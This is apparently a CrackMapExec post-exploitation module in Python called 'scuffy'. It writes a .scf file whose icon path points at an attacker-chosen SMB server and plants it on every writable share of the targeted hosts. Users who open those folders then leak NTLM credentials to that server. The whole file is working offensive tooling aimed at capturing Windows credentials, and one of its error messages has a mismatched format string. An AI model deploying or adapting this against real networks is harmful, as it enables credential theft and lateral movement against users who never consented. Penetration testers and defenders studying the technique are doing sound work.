import os
import ntpath

from sys import exit

class CMEModule:
    '''
        Original idea and PoC by Mubix "Rob" Fuller
        URL: https://room362.com/post/2016/smb-http-auth-capture-via-scf/
        Module by: @kierangroome
    '''

    name = 'scuffy'
    description = 'Creates and dumps an arbitrary .scf file with the icon property containing a UNC path to the declared SMB server against all writeable shares'
    supported_protocols = ['smb']
    opsec_safe= False
    multiple_hosts = True

    def options(self, context, module_options):
        '''
        SERVER      IP of the SMB server
        NAME        SCF file name
        CLEANUP     Cleanup (choices: True or False)
        '''

        self.cleanup = False

        if 'CLEANUP' in module_options:
            self.cleanup = bool(module_options['CLEANUP'])

        if 'NAME' not in module_options:
             context.log.error('NAME option is required!')
             exit(1)
  
        if not self.cleanup and 'SERVER' not in module_options:
            context.log.error('SERVER option is required!')
            exit(1)
 
        self.scf_name = module_options['NAME']
        self.scf_path = '/tmp/{}.scf'.format(self.scf_name)
        self.file_path = ntpath.join('\\', '{}.scf'.format(self.scf_name))
  
        if not self.cleanup:
            self.server = module_options['SERVER']
            scuf = open(self.scf_path, 'a');
            scuf.write("[Shell]" + '\n');
            scuf.write("Command=2" + '\n');
            scuf.write("IconFile=" + '\\\\{}\\share\\icon.ico'.format(self.server) + '\n');
            scuf.close();

    def on_login(self, context, connection):
        shares = connection.shares()
        for share in shares:
            if 'WRITE' in share['access'] and share['name'] not in ['C$', 'ADMIN$']:
                #print share
                context.log.success('Found writable share: {}'.format(share['name']))
                if not self.cleanup:
                    with open(self.scf_path, 'rb') as scf:
                        try:
                            connection.conn.putFile(share['name'], self.file_path, scf.read)
                            context.log.success('Created SCF file on the {} share'.format(share['name']))
                        except Exception as e:
                            context.log.error('Error writing SCF file to share {}: {}'.format(share['name']))
                else:
                    try:
                        connection.conn.deleteFile(share['name'], self.file_path)
                        context.log.success('Deleted SCF file on the {} share'.format(share['name']))
                    except Exception as e:
                        context.log.error('Error deleting SCF file on share {}: {}'.format(share['name'], e))
